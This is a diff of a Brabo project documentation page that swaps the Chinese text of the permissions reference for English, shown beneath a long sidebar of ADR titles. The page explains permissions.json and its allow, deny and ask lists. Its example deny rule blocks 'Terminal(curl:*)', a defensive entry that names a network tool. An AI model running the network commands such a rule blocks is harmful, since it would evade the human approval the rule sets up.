href="../adr/0137-o-runner-sobe-o-container-do-projeto.html">ADR 0137 — `brabo-runner` 在用户的机器上启动项目容器</a></li><li><a href="../adr/0143-agentes-de-dev-so-depois-do-container.html">ADR 0143 — dev agent 只在容器之后</a></li><li><a href="../adr/0144-a-segunda-raiz-do-broker.html">ADR 0144 — broker 的第二个根，以及选择它的可辨识定位符</a></li><li><a href="../adr/0180-container-com-o-dono-da-pasta.html">ADR 0180 — 项目容器以文件夹所有者身份运行，由 api 测量</a></li><li><a href="../adr/0190-a-infra-sobe-o-container-no-aceite.html">ADR 0190 — Infra 在接受 handoff 时启动容器，由服务器执行这一步并预置自主度，并由它交接给 Dev Lead</a></li><li><a href="../adr/0199-recurso-minimo-derivado-do-module-map.html">ADR 0199 — 容器的最低资源从 `module_map` 派生：每个模块声明自己的，Infra 按总和启动</a></li><li><a href="../adr/0208-a-infra-herda-a-rede-do-arquiteto.html">ADR 0208 — Infra 继承 Arquiteto 声明的网络</a></li><li><a href="../adr/0228-comando-do-app-e-rede-do-container.html">ADR 0228 — 项目容器通过声明的命令启动应用，并且仅在 loopback 上发布端口</a></li><li><a href="../adr/0229-instancia-de-qa-efemera-com-servicos-declarados-pela-infra.html">ADR 0229 — QA 在临时实例中测试，使用 Infra 声明的服务</a></li></ul></li><li><span>O runner local</span><ul><li><a href="../adr/0103-runner-local-execucao-na-maquina-do-usuario.html">ADR 0103 — 本地 runner：通过带一次性 ticket 的 Phoenix 通道在用户机器上执行</a></li><li><a href="../adr/0105-personal-access-token-do-runner-escopado-por-construcao.html">ADR 0105 — 给 runner 的 Personal Access Token（`brb_…`），按构造限定到一条路由</a></li><li><a href="../adr/0106-distribuicao-do-runner-via-tsup-e-npm-publish.html">ADR 0106 — 通过 `tsup` 和 `npm publish` 分发 `@brabo/runner`，版本只在 CI 中注入</a></li><li><a href="../adr/0112-binario-standalone-do-runner-via-bun-build-compile.html">ADR 0112 — 通过 `bun build --compile` 构建 `@brabo/runner` 的独立二进制，原生插件 `.node` 通过真实解压到临时目录的方式嵌入</a></li><li><a href="../adr/0118-configuracao-automatica-do-runner-pelo-navegador.html">ADR 0118 — 通过浏览器配置 runner：Ed25519 设备密钥作为 `runner-ticket` 的第二种凭据、GitHub Releases 的二进制代理，以及用 File System Access API 一键配置文件夹</a></li><li><a href="../adr/0145-docker-pre-requisito-do-runner.html">ADR 0145 — Docker 成为 `runner` 模式的真正前提</a></li><li><a href="../adr/0147-agente-local-com-capacidades.html">ADR 0147 — 一个本地 agent，在连接时声明能力</a></li><li><a href="../adr/0151-base-consentida-no-runner.html">ADR 0151 — runner 中经同意的基础目录，以及通过通道创建文件夹</a></li><li><a href="../adr/0154-chave-de-dispositivo-de-maquina.html">ADR 0154 — 机器级的设备密钥</a></li><li><a href="../adr/0174-runner-sem-binario-darwin-x64.html">ADR 0174 — runner 的独立二进制不再承诺 Mac Intel</a></li><li><a href="../adr/0187-runner-sem-binario-win32-x64.html">ADR 0187 — runner 的独立二进制不再承诺 Windows</a></li><li><a href="../adr/0193-git-credenciado-no-host-do-runner.html">ADR 0193 — 带凭据的 git 在 runner 的**宿主机**上运行；代码在容器中运行</a></li><li><a href="../adr/0201-revogacao-por-chave.html">ADR 0201 — 吊销针对的是**密钥**，而不是 `{projeto, usuário}` 这一对</a></li><li><a href="../adr/0203-aposenta-o-fluxo-do-runner-pelo-navegador.html">ADR 0203 — 通过浏览器配置 runner 的流程退役，路径改为安装程序</a></li><li><a href="../adr/0230-importar-chave-de-llm-pelo-runner.html">ADR 0230 — runner 导入用户机器上已有的 LLM API 密钥</a></li></ul></li><li><span>Autenticação, acesso e segredos</span><ul><li><a href="../adr/0031-auth-first-party-argon2id-e-rotacao-de-refresh.html">ADR 0031 — 自有认证：argon2id、EdDSA 与 refresh 轮换</a></li><li><a href="../adr/0032-corte-do-keycloak-e-sessao-em-cookie.html">ADR 0032 — 切除 Keycloak：自有签发方、service token 与 cookie 中的会话</a></li><li><a href="../adr/0037-cors-do-engine-e-a-porta-como-contrato.html">ADR 0037 — engine 所缺的 CORS，以及端口作为契约的一部分</a></li><li><a href="../adr/0050-credencial-sempre-cifrada-verificacao-explicita.html">ADR 0050 — 凭据总是被加密；验证成为显式动作</a></li><li><a href="../adr/0058-csp-fechado-na-api-e-escopo-de-projeto-contido.html">ADR 0058 — api 中封闭的 CSP，以及约束在根内的项目范围</a></li><li><a href="../adr/0059-segredo-do-state-de-oauth-sem-default.html">ADR 0059 — 签署 git OAuth `state` 的密钥没有默认值</a></li><li><a href="../adr/0084-login-social-github-e-gitlab.html">ADR 0084 — 社交登录（GitHub/GitLab），修订 ADR 0031/0032 的 backlog</a></li><li><a href="../adr/0096-smtp-real-no-mailsender.html">ADR 0096 — `MailSender` 中的真实 SMTP，置于显式开关之后</a></li><li><a href="../adr/0127-tetos-de-rebaixamento-em-project-members.html">ADR 0127 — `project_members` 中的两道降级上限，覆盖关系保留</a></li><li><a href="../adr/0156-teto-de-auto-rebaixamento-na-remocao.html">ADR 0156 — 自我降级上限同样适用于移除项目成员</a></li><li><a href="../adr/0157-teto-de-auto-movimento-no-upsert-de-workspace.html">ADR 0157 — workspace upsert 中的自我变动上限，以及原本是漏洞的自我晋升</a></li><li><a href="../adr/0158-o-id-da-chave-mestra-gravado-no-envelope.html">ADR 0158 — 主密钥的 id 写入信封，作为可观测性，绝不作为权威</a></li><li><a href="../adr/0173-remocao-de-membro-de-workspace.html">ADR 0173 — workspace 成员的移除诞生，由同一条款保护</a></li><li><a href="../adr/0245-acesso-rapido-por-papel-so-no-ambiente-local.html">ADR 0245 — 按角色快速访问仅限本地环境</a></li></ul></li><li><span>Providers de LLM, modelos e gasto</span><ul><li><a href="../adr/0040-moeda-do-dashboard.html">ADR 0040 — 仪表盘的货币：暂用 USD，按 workspace 的手动汇率推迟</a></li><li><a href="../adr/0041-base-openai-compativel-e-contrato-de-llm-providers.html">ADR 0041 — 一个 OpenAI 兼容基类、一份 LLM provider 合约，以及会拒绝 binding 的 capabilities</a></li><li><a href="../adr/0042-catalogo-vivo-ciclo-de-vida-do-modelo-e-preco-auditavel.html">ADR 0042 — 活目录、模型生命周期与可审计的价格</a></li><li><a href="../adr/0043-seis-providers-de-llm-e-o-fechamento-da-fase-9b.html">ADR 0043 — 在基础之上的六个 LLM provider，Fase 9b 终于关闭</a></li><li><a href="../adr/0049-curadoria-de-modelo-por-workspace.html">ADR 0049 — 按 workspace 的模型策展</a></li><li><a href="../adr/0051-facetas-de-capability-e-curadoria-por-uso.html">ADR 0051 — 已证明的能力维度；“用来做什么”是策展</a></li><li><a href="../adr/0063-duas-audiencias-para-o-mesmo-gasto.html">ADR 0063 — 同一笔花费的两种受众：owner 的账单与成员的消耗</a></li><li><a href="../adr/0064-escopo-de-area-na-cascata-e-o-binding-de-agente-global.html">ADR 0064 — 模型级联中的领域范围，以及全局的 agent 绑定</a></li><li><a href="../adr/0075-embeddings-no-contrato-de-llm-provider.html">ADR 0075 — LLMProvider 合约中的 embedding</a></li><li><a href="../adr/0076-provider-volta-a-ser-dimensao-de-gasto.html">ADR 0076 — `provider` 重新成为花费维度，约束改由类型承担</a></li><li><a href="../adr/0077-ranking-de-modelos-por-capacidade-sem-nota-inventada.html">ADR 0077 — 按能力的模型排名，不编造评分</a></li><li><a href="../adr/0110-budget-por-area-aditivo-nao-cascata.html">ADR 0110 — 按区域的预算是叠加的，与项目/会话并列——不是级联，也不是新表</a></li><li><a href="../adr/0114-deteccao-de-ollama-nativo-no-bootstrap-dev.html">ADR 0114 — 在开发引导中检测原生 Ollama：只问一次，持久化到 `.env`，把 compose 的服务放到 profile 之后</a></li><li><a href="../adr/0115-pedido-de-pull-de-modelo-huggingface-tabela-propria.html">ADR 0115 — 从 Hugging Face 拉取模型：独立的表、两步确认以及官方发布者 allowlist——绝不使用 `proposed_actions`</a></li><li><a href="../adr/0166-preferencia-de-roteamento-no-binding-de-modelo.html">ADR 0166 — 路由偏好住在模型 binding 中，随它一起传递，并在计量中冻结</a></li><li><a href="../adr/0188-o-custo-real-do-provider-vira-o-numero-do-metering.html">ADR 0188 — provider 返回的真实成本成为计量的数字</a></li><li><a href="../adr/0198-duplicata-semantica-por-embedding-com-limiar-que-so-avisa.html">ADR 0198 — 故事与规则的语义重复通过带阈值的 embedding 提醒，花费进入计量</a></li><li><a href="../adr/0221-upstream-preso-por-sessao.html">ADR 0221 — hub 按 `session_id` 将每个智能体的对话绑定到服务它的 upstream</a></li><li><a href="../adr/0222-provider-9router-de-llm.html">ADR 0222 — 9Router 成为第 10 个 LLM provider，URL 按安装配置</a></li><li><a href="../adr/0223-orcamento-de-raciocinio-por-modelo.html">ADR 0223 — 推理预算是按模型的 capability，人工策展</a></li><li><a href="../adr/0224-raciocinio-abortado-no-stream.html">ADR 0224 — 推理在 stream 中被计数并在上限处中止，成本先估算再对账</a></li><li><a href="../adr/0225-teto-de-preco-do-upstream-no-openrouter.html">ADR 0225 — OpenRouter 每次调用获得价格上限（`provider.max_price` = 目录价 × 1,5）</a></li><li><a href="../adr/0227-provider-opencode-zen-de-llm.html">ADR 0227 — OpenCode Zen 成为第 11 个 LLM provider，仅使用 OpenAI 方言</a></li><li><a href="../adr/0233-membro-ve-o-gasto-do-projeto-sem-credencial.html">ADR 0233 — 成员按智能体和领域查看项目开销，绝不按 provider</a></li><li><a href="../adr/0251-preco-de-lista-datado-para-provider-sem-preco.html">ADR 0251 — 对不提供价格的 provider，在代码中标注日期的标价</a></li><li><a href="../adr/0257-na-anthropic-direta-o-raciocinio-desligado-e-por-modelo.html">ADR 0257 — Na Anthropic direta o raciocínio desligado é por modelo e o esforço reduz o Opus</a></li></ul></li><li><span>RAG, grafo de conhecimento e artefatos</span><ul><li><a href="../adr/0079-tabela-de-chunks-vetor-e-tsvector-juntos.html">ADR 0079 — chunk 表：向量与 `tsvector` 在同一行</a></li><li><a href="../adr/0080-busca-hibrida-pesos-limiar-e-citacao.html">ADR 0080 — 混合搜索：权重、阈值，以及什么算引用</a></li><li><a href="../adr/0082-chat-rag-aba-de-busca-hibrida.html">ADR 0082 — Chat RAG：混合搜索的独立标签页，不重命名“Chat”</a></li><li><a href="../adr/0099-neo4j-grafo-de-conhecimento-e-templates.html">ADR 0099 — Neo4j 作为知识图谱和 prompt 模板，驱动放在 api 中</a></li><li><a href="../adr/0100-rag-search-e-modelos-garantidos-no-boot.html">ADR 0100 — 面向 agent 的 `rag_search`，以及启动时确保存在的 Ollama 模型</a></li><li><a href="../adr/0101-memoria-relacional-como-projecao-do-event-log.html">ADR 0101 — 关系记忆作为事件日志的投影；在不触碰 GenServer 的情况下使用模板</a></li><li><a href="../adr/0113-pasta-local-anexada-via-navegador-vira-chunks-scope-local.html">ADR 0113 — 附加的本地目录成为 `chunks.scope = 'local'`，由**浏览器**读取，绝不是主机路径</a></li><li><a href="../adr/0129-telemetria-de-busca-do-rag-como-tabela.html">ADR 0129 — RAG 搜索的遥测是**表**，权重冻结在行中</a></li><li><a href="../adr/0132-golden-set-de-acerto-do-rag.html">ADR 0132 — RAG 命中率的 golden-set，以及 gate `rag-acertivo`</a></li><li><a href="../adr/0138-golden-set-do-rag-em-ci-agendado.html">ADR 0138 — RAG 的 golden-set 开始在 CI 中定时运行——并且仍然是 `warn`</a></li><li><a href="../adr/0148-artefatos-projetados-em-arquivo.html">ADR 0148 — agent 的工件以文件形式投影到一个 `docs/` 目录</a></li><li><a href="../adr/0196-anamnese-religada-com-sujeito-e-fato-do-perfil.html">ADR 0196 — 重新启用的 Anamnese：没有主体就不运行，被接受的假设成为画像事实</a></li><li><a href="../adr/0200-contrato-entre-modulos-artefato-do-arquiteto.html">ADR 0200 — 模块间合约成为 Arquiteto 的版本化工件，dev agent 读取它而不是别人的 worktree</a></li><li><a href="../adr/0205-desvio-do-agente-como-sinal-do-produto.html">ADR 0205 — Anamnese 观察到的 agent 偏差成为产品信号，不含个人数据</a></li></ul></li><li><span>Interface web e design system</span><ul><li><a href="../adr/0036-telas-de-auth-fieis-ao-design-e-fontes-auto-hospedadas.html">ADR 0036 — 忠实于设计的认证界面，以及三种无法加载的字体</a></li><li><a href="../adr/0060-superficie-de-leitura-de-codigo.html">ADR 0060 — 代码的读取面，受约束且有预算</a></li><li><a href="../adr/0074-tema-alcancavel-e-o-boot-sob-csp.html">ADR 0074 — 可切换的主题，以及 CSP 下的启动</a></li><li><a href="../adr/0078-moldura-de-tela-e-o-registro-de-abas-diverge-do-handoff.html">ADR 0078 — 界面框架，以及标签页注册表刻意偏离 handoff</a></li><li><a href="../adr/0097-leitura-direta-do-schema-do-engine-para-online-agent-count.html">ADR 0097 — 为仪表盘的“N 个 agent 在线”直接读取 engine 的 schema</a></li><li><a href="../adr/0116-tipos-do-web-gerados-do-openapi.html">ADR 0116 — `ActionType`（以及将来的类型）由 OpenAPI 契约生成，而不是手工复制</a></li><li><a href="../adr/0122-sessionpage-dividido-em-cinco-prs.html">ADR 0122 — `SessionPage.tsx` 拆分为五个机械式 PR，并事先声明</a></li><li><a href="../adr/0124-hook-do-canal-de-turno-do-sessionpage.html">ADR 0124 — 轮次通道的状态分组抽取到 `useTurnoDoAgente`</a></li><li><a href="../adr/0125-projectsettingstab-dividido-por-secao.html">ADR 0125 — 把 `ProjectSettingsTab.tsx` 拆分为每个分区一个文件，置于一个 barrel 之后</a></li><li><a href="../adr/0126-trilho-vertical-de-navegacao-do-projeto.html">ADR 0126 — 项目页面通过垂直轨道导航，代码标签页不再自行折叠侧边栏</a></li><li><a href="../adr/0176-sessionpage-abaixo-de-mil-linhas.html">ADR 0176 — `SessionPage.tsx` 降到 1 000 行以下，分十个机械式 PR，之后才加锁</a></li><li><a href="../adr/0181-tema-preto-neutro.html">ADR 0181 — 深色主题变为中性黑，对比度债务结束</a></li><li><a href="../adr/0210-animacao-de-texto-com-motion.html">ADR 0210 — 用 `motion` 做文本动画</a></li><li><a href="../adr/0211-uma-navegacao-so-a-sidebar-absorve-o-trilho.html">ADR 0211 — 只有一种导航：侧边栏吸收项目轨道</a></li><li><a href="../adr/0232-shadcn-com-base-ui-no-apps-web.html">ADR 0232 — `apps/web` 中使用 Base UI 的 shadcn/ui 与 Tailwind 4</a></li><li><a href="../adr/0234-shiki-e-recharts-por-carga-dinamica.html">ADR 0234 — Code Block 的 `shiki` 与 Chart 的 `recharts`，始终动态加载</a></li><li><a href="../adr/0237-o-visual-v3-liga-o-preflight-e-sobe-os-raios.html">ADR 0237 — 视觉 v3 启用 preflight 并加大圆角</a></li><li><a href="../adr/0238-o-grafo-de-modulos-vira-canvas-xyflow.html">ADR 0238 — 架构页的模块图变为 Canvas（`@xyflow/react`）</a></li><li><a href="../adr/0239-csp-frame-src-local-para-o-web-preview.html">ADR 0239 — 用于交付物 Web preview 的本地 CSP `frame-src`</a></li><li><a href="../adr/0240-o-motivo-de-controle-inerte-mora-num-ponto-de-interrogacao-nos-containers.html">ADR 0240 — 控件失效的原因可以放在容器页面的可用&quot;?&quot;中</a></li><li><a href="../adr/0241-a-sidebar-adota-o-block-sidebar-07-do-shadcn.html">ADR 0241 — 侧边栏采用 shadcn 的 `sidebar-07` block</a></li><li><a href="../adr/0242-containers-em-tabela-linear-com-tanstack-react-table.html">ADR 0242 — 容器使用 `@tanstack/react-table` 的线性表格</a></li><li><a href="../adr/0243-consequencia-irreversivel-pode-morar-num-botao-de-perigo.html">ADR 0243 — 不可逆的后果可以放在危险按钮中</a></li><li><a href="../adr/0244-coluna-das-abas-do-projeto-alinhada-a-esquerda.html">ADR 0244 — 项目标签页的列左对齐</a></li><li><a href="../adr/0248-conteudo-das-paginas-ocupa-a-largura-inteira.html">ADR 0248 — 页面内容占满整个宽度</a></li><li><a href="../adr/0250-chat-da-sessao-ocupa-a-largura-inteira.html">ADR 0250 — 会话聊天占满整个宽度</a></li></ul></li><li><span>Operação, deploy e instalação</span><ul><li><a href="../adr/0024-fase5-imagens-producao-ci.html">ADR 0024 — 阶段 5（第 1 次会话）：生产镜像、compose.prod、CI 与冒烟测试</a></li><li><a href="../adr/0025-fase5-deploy-kubernetes-kustomize.html">ADR 0025 — 阶段 5（第 2 次会话）：使用 Kustomize 部署 Kubernetes、队列指标与本地 overlay</a></li><li><a href="../adr/0026-fase5-observabilidade-e-graceful-shutdown.html">ADR 0026 — 阶段 5（第 3 次会话）：优雅关闭、OpenTelemetry、指标、日志与仪表盘</a></li><li><a href="../adr/0027-fase5-backup-hardening-release.html">ADR 0027 — 备份/还原、api 加固、暴露面与发布</a></li><li><a href="../adr/0035-observabilidade-legivel-e-trace-sem-coletor.html">ADR 0035 — 没有 collector 的 trace，以及日志中跨层的路径</a></li><li><a href="../adr/0070-observabilidade-no-compose-local.html">ADR 0070 — 本地 Compose 中的可观测性：指标和日志，没有 trace</a></li><li><a href="../adr/0150-instalador-de-uma-linha.html">ADR 0150 — 一行安装程序，带可选来源和标记文件</a></li><li><a href="../adr/0152-backup-de-volumes-contra-compose.html">ADR 0152 — 针对 compose 的卷备份与恢复</a></li><li><a href="../adr/0153-deploy-enabled-o-gatilho-que-ninguem-cria.html">ADR 0153 — `DEPLOY_ENABLED`：十份文档引用、却无人创建的触发器</a></li><li><a href="../adr/0155-a-primeira-conta-nasce-no-terminal.html">ADR 0155 — 第一个账户在终端中诞生，本地 agent 启动时即已配对</a></li><li><a href="../adr/0160-o-compose-do-instalador-viaja-assinado.html">ADR 0160 — 安装程序的 compose 随它一起传送，作为已签名的 asset</a></li><li><a href="../adr/0161-a-tela-so-oferece-o-modo-que-a-instalacao-executa.html">ADR 0161 — 界面只提供安装能执行的模式，而通过 Release 的安装没有 broker</a></li><li><a href="../adr/0162-broker-publicado-e-oferecido-pelo-instalador.html">ADR 0162 — broker 成为第五个发布的镜像，安装程序**询问**是否启用它</a></li><li><a href="../adr/0169-seaweedfs-no-lugar-do-minio-no-overlay-local.html">ADR 0169 — 本地 overlay 的 S3 目标不再是 MinIO，改为 SeaweedFS</a></li><li><a href="../adr/0170-compose-de-dev-brabo-dev.html">ADR 0170 — 开发用 compose 改名为 `brabo-dev`，开发环境拒绝在安装旁边启动</a></li><li><a href="../adr/0209-engine-em-otp-29.html">ADR 0209 — engine 升级到 Elixir 1.20.4 / OTP 29.1.1</a></li><li><a href="../adr/0256-a-migracao-restaura-o-banco-num-banco-vazio.html">ADR 0256 — A migração do instalador restaura o banco num banco recém-criado e vazio</a></li></ul></li><li><span>CI, release e cadeia de suprimentos</span><ul><li><a href="../adr/0039-actionlint-e-validacao-do-pipeline-de-ci-gerado.html">ADR 0039 — actionlint 与生成的 CI 管道的验证</a></li><li><a href="../adr/0119-imagens-publicadas-no-ghcr-por-digest.html">ADR 0119 — 每个正式 tag 都把镜像发布到 GHCR，生产 overlay 按 digest 固定</a></li><li><a href="../adr/0120-e2e-de-navegador-contra-o-compose-de-producao.html">ADR 0120 — 针对生产 compose 的浏览器 E2E，放在 workspace 之外的包中</a></li><li><a href="../adr/0121-schema-dividido-por-agregado-de-dominio.html">ADR 0121 — schema 按领域聚合拆分，置于一个 barrel 之后</a></li><li><a href="../adr/0140-timeout-do-audit-como-risco-assumido.html">ADR 0140 — `pnpm audit` 反复超时是承担的风险；发现问题仍然失败</a></li><li><a href="../adr/0149-assinatura-dos-artefatos-publicados.html">ADR 0149 — 已发布工件的签名</a></li><li><a href="../adr/0159-imagem-de-terceiro-por-digest.html">ADR 0159 — 第三方镜像按 digest 引入，lint 让忘记的人失败</a></li><li><a href="../adr/0172-trivy-no-release-antes-de-assinar.html">ADR 0172 — 发布在签名之前按 digest 用 Trivy 扫描它所发布的东西</a></li><li><a href="../adr/0178-tag-inline-na-imagem-de-terceiro.html">ADR 0178 — 第三方镜像的 tag 住在引用**之内**，位于 digest 之前</a></li><li><a href="../adr/0197-a-imagem-dos-workflows-vem-do-compose.html">ADR 0197 — workflow 的镜像来自 compose，并启用镜像的 Dependabot</a></li><li><a href="../adr/0252-o-brabo-vira-um-conjunto-de-repositorios.html">ADR 0252 — Brabo 变成 `viralabs-dev` 中的一组仓库</a></li></ul></li><li><span>Documentação</span><ul><li><a href="../adr/0029-sincronizacao-continua-da-documentacao.html">ADR 0029 — 文档的持续同步</a></li><li><a href="../adr/0033-referencia-de-api-gerada-do-openapi.html">ADR 0033 — API 参考由代码产出，表格测试对元数据提出要求</a></li><li><a href="../adr/0034-documentacao-publicada-por-degrau.html">ADR 0034 — 按阶梯发布的文档，位于 Pages 的子目录中</a></li><li><a href="../adr/0071-publicacao-simetrica-por-degrau.html">ADR 0071 — 按阶梯对称发布，以及一个供选择的根</a></li><li><a href="../adr/0073-o-caminho-publicado-nomeia-o-ambiente.html">ADR 0073 — 发布路径命名的是环境，而不是分支</a></li><li><a href="../adr/0117-lockfile-proprio-para-o-website.html">ADR 0117 — `website/` 拥有自己的 lockfile，脱离产品的 `pnpm audit`</a></li><li><a href="../adr/0202-o-indice-de-adr-por-tema.html">ADR 0202 — 按主题组织的 ADR 索引，主题放在 ADR 之外</a></li><li><a href="../adr/0206-referencia-da-api-numa-pagina-redoc.html">ADR 0206 — API 参考变成一个 Redoc 页面</a></li><li><a href="../adr/0216-quatro-idiomas-com-pt-br-como-fonte.html">ADR 0216 — 四种语言，以 pt-BR 作为**来源**和默认：文档与界面提供葡萄牙语、英语、俄语和简体中文</a></li><li><a href="../adr/0218-titulo-de-adr-com-prefixo.html">ADR 0218 — 每个 ADR 都命名为“ADR NNNN — 标题”</a></li><li><a href="../adr/0219-referencia-entra-na-traducao.html">ADR 0219 — 参考文档纳入翻译</a></li><li><a href="../adr/0220-api-traduzida-por-catalogo.html">ADR 0220 — API 页面按目录翻译</a></li><li><a href="../adr/0253-o-site-de-docs-deixa-o-docusaurus.html">ADR 0253 — 文档站点离开 Docusaurus</a></li><li><a href="../adr/0254-a-doc-de-cada-area-mora-na-raiz-dela.html">ADR 0254 — 每个领域的文档位于它自己的根目录</a></li><li><a href="../adr/0260-doc-dos-repos-de-codigo-so-em-ingles.html">ADR 0260 — 代码仓库的文档只用英文；站点以横幅提供英文原文</a></li></ul></li></ul></li></ul></section><section><h2>📐 规则</h2><ul><li><a href="../business-rules.html">业务规则</a></li><li><a href="../business-rules/custo.html">成本与计量</a></li><li><a href="../business-rules/autenticacao.html">认证</a></li><li><a href="../business-rules/api.html">API</a></li><li><a href="../business-rules/broker.html">Broker</a></li><li><a href="../business-rules/ci.html">CI</a></li><li><a href="../business-rules/contracts.html">Contracts</a></li><li><a href="../business-rules/engine.html">Engine</a></li><li><a href="../business-rules/infra.html">Infra</a></li><li><a href="../business-rules/produto.html">Produto</a></li><li><a href="../business-rules/runner.html">Runner</a></li><li><a href="../business-rules/web.html">Web</a></li></ul></section><section><h2>📖 参考</h2><ul><li><a href="../reference/configuration.html">Configuração</a></li><li><a href="../reference/events.html">Eventos</a></li><li><a href="../reference/permissions.html" aria-current="page">Permissões</a></li><li><a href="../reference/artifacts.html">Artefatos</a></li><li><a href="../reference/git-providers.html">Provedores de git</a></li><li><a href="../reference/internal-api.html">API interna</a></li><li><a href="../reference/scripts.html">Scripts e comandos</a></li><li><a href="../reference/rulesets.html">Rulesets do repositório</a></li><li><a href="../reference/paridade-de-traducao.html">Paridade de tradução</a></li><li><a href="../reference/brb.html">Registro BRB</a></li><li><a href="../security-surface.html">Api's Exposed Surface</a></li><li><span>API 参考</span></li></ul></section><section><h2>💡 解释</h2><ul><li><span>流程与流水线</span><ul><li><a href="../explanation/documentation-workflow.html">文档同步</a></li><li><a href="../explanation/branching-policy.html">分支策略</a></li><li><a href="../explanation/cadeia-de-suprimentos-do-ci.html">CI 的供应链</a></li><li><a href="../explanation/release-do-produto.html">产品发布</a></li><li><a href="../explanation/gates.html">gates，以及如何测量它们</a></li><li><a href="../explanation/observability.html">Observability</a></li><li><a href="../explanation/modelo-de-time.html">团队模型与交付物流程</a></li></ul></li><li><span>验证与测量</span><ul><li><a href="../explanation/primeiro-dogfooding.html">第一次 dogfooding</a></li><li><a href="../explanation/execucao-real-hello-world.html">真实执行（hello world）</a></li><li><a href="../explanation/achados-execucao-real.html">流水线真实执行中的发现</a></li><li><a href="../explanation/validacao-fase-12.html">Fase 12 的验证</a></li><li><a href="../explanation/validacao-real.html">真实验证（13b）</a></li><li><a href="../explanation/aceite-providers.html">Provider acceptance</a></li><li><a href="../explanation/medicao-do-idioma.html">语言启发式的测量</a></li><li><a href="../explanation/medicao-do-jev.html">Jev 工具路由器的测量</a></li><li><a href="../explanation/auditoria-fluxo-vs-codigo.html">审计：fluxo.yml × 代码（v3，ADR 0085）</a></li><li><a href="../explanation/auditoria-visual-rodada-29.html">视觉审计：Rodada 29 之前与之后</a></li></ul></li><li><span>阶段历史</span><ul><li><a href="../explanation/historico-de-fases.html">阶段历史</a></li><li><a href="../explanation/fase-28-pasta-do-usuario.html">FASE 28 — 用户的目录</a></li><li><a href="../explanation/fase-29-instalacao-de-uma-linha.html">FASE 29 — 一行命令安装</a></li><li><a href="../explanation/fase-30-runner-por-maquina.html">FASE 30——机器的本地智能体</a></li><li><a href="../explanation/backlog.html">已分类的 backlog</a></li></ul></li><li><span>本地化</span><ul><li><a href="../explanation/localizacao.html">本地化</a></li><li><a href="../explanation/localizacao-en.html">本地化——英语（en）</a></li><li><a href="../explanation/localizacao-ru.html">本地化——俄语（ru）</a></li><li><a href="../explanation/localizacao-zh-hans.html">本地化——简体中文（zh-Hans）</a></li></ul></li><li><span>技术笔记</span><ul><li><a href="../explanation/tanstack-ai.html">TanStack AI — not adopted</a></li></ul></li></ul></section><section><h2>🛠️ 运维</h2><ul><li><a href="../runbook.html">Runbook</a></li></ul></section><section><h2>📚 词汇</h2><ul><li><a href="../glossary.html">术语表</a></li></ul></section><section><h2>🤝 贡献</h2><ul><li><a href="https://github.com/viralabs-dev/brabo/blob/dev/CONTRIBUTING.md">如何贡献</a></li><li><a href="https://github.com/viralabs-dev/brabo/blob/dev/SUPPORT.md">在哪里求助</a></li><li><a href="https://github.com/viralabs-dev/brabo/blob/dev/SECURITY.md">报告漏洞</a></li></ul></section></nav>
 <main>
-
+<div class="site-faixa" role="note">此页仅有英文版本；显示英文原文。</div>
 <article class="doc">
-<h1 id="权限">权限</h1>
-<p>每个有外部效果的动作都以 <code>proposed_action</code> 诞生，并在执行之前经过这里。本页是确切的格式与语义——规则本身见 <a href="../business-rules/api.html#rn-004">业务规则</a>。</p>
-<h2 id="文件">文件</h2>
-<p><code>permissions.json</code> 位于<strong>项目工作区的根目录</strong>——它是磁盘上一个真实的、可纳入版本控制的文件，而不是数据库中的一列。</p>
+<h1 id="permissions">Permissions</h1>
+<p>Every action with an external effect is born as a <code>proposed_action</code> and goes
+through here before executing. This page is the exact format and semantics —
+the rules themselves are in <a href="../business-rules/api.html#rn-004">Business rules</a>.</p>
+<h2 id="the-file">The file</h2>
+<p><code>permissions.json</code> lives at the <strong>root of the project workspace</strong> — it's a
+real file on disk, versionable, not a column in the database.</p>
 <pre class="shiki brabo" style="background-color:var(--shiki-background);color:var(--shiki-foreground)" tabindex="0"><code><span class="line"><span style="color:var(--shiki-foreground)">{</span></span>
 <span class="line"><span style="color:var(--shiki-token-keyword)">  "allow"</span><span style="color:var(--shiki-token-punctuation)">:</span><span style="color:var(--shiki-foreground)"> [</span><span style="color:var(--shiki-token-string-expression)">"Terminal(pnpm test:*)"</span><span style="color:var(--shiki-token-punctuation)">,</span><span style="color:var(--shiki-token-string-expression)"> "Terminal(git status)"</span><span style="color:var(--shiki-foreground)">]</span><span style="color:var(--shiki-token-punctuation)">,</span></span>
 <span class="line"><span style="color:var(--shiki-token-keyword)">  "deny"</span><span style="color:var(--shiki-token-punctuation)">:</span><span style="color:var(--shiki-foreground)">  [</span><span style="color:var(--shiki-token-string-expression)">"Terminal(curl:*)"</span><span style="color:var(--shiki-foreground)">]</span><span style="color:var(--shiki-token-punctuation)">,</span></span>
 <span class="line"><span style="color:var(--shiki-token-keyword)">  "ask"</span><span style="color:var(--shiki-token-punctuation)">:</span><span style="color:var(--shiki-foreground)">   [</span><span style="color:var(--shiki-token-string-expression)">"GitPush()"</span><span style="color:var(--shiki-foreground)">]</span></span>
 <span class="line"><span style="color:var(--shiki-foreground)">}</span></span>
 <span class="line"></span></code></pre>
-<p>三个列表，三种含义：</p>
+<p>Three lists, three meanings:</p>
 <div class="tabela-rolavel"><table>
 <thead>
 <tr>
-<th>列表</th>
-<th>含义</th>
+<th>list</th>
+<th>meaning</th>
 </tr>
 </thead>
 <tbody>
 <tr>
 <td><code>allow</code></td>
-<td><code>auto_approve</code> — 动作不询问直接执行</td>
+<td><code>auto_approve</code> — the action executes without asking</td>
 </tr>
 <tr>
 <td><code>deny</code></td>
-<td><code>deny</code> — 被拒绝，任何东西都无法逆转</td>
+<td><code>deny</code> — refused, and nothing reverts this</td>
 </tr>
 <tr>
 <td><code>ask</code></td>
-<td><code>require_approval</code> — 进入审批队列</td>
+<td><code>require_approval</code> — goes to the approval queue</td>
 </tr>
 </tbody>
 </table></div>
-<p>没有任何列表匹配？动作默认保持 <code>pending</code>。<strong>没有规则永远不等于许可。</strong></p>
-<h3 id="自动批准的动作用哪个凭据执行">自动批准的动作用哪个凭据执行</h3>
-<p><code>auto_approve</code> 的意思是<strong>没有人做出决定</strong>——
-<code>proposed_actions.decided_by</code> 保持 <code>NULL</code>。这对执行方很重要：针对远程 provider 的 git 动作需要一个 token，而在这条路径上“做出决定者的 token”并不存在。</p>
-<p>答案是<strong>工作区的 owner</strong>（<a href="../business-rules/api.html#rn-082">RN-082</a>），
-与 LLM 密钥相同（<a href="../business-rules/api.html#rn-058">RN-058</a>）——为账户付费的人也为 agent 付费，这不随点击者而改变。</p>
